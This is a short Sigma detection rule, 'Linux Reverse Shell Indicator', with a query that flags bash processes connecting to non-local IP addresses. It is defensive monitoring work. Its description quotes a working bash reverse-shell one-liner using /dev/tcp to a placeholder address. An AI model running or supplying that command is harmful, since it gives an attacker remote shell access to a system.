Description:
Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

Author: Florian Roth (Nextron Systems)
Sigma Repository: [GitHub](https://github.com/SigmaHQ/sigma)
Name: Linux Reverse Shell Indicator
Query: sourcetype like 'linux-%' eql select * from _source_ where (process_path like '%/bin/bash' and  not (dst_ip = '127.0.0.1' or dst_ip = '0.0.0.0'))
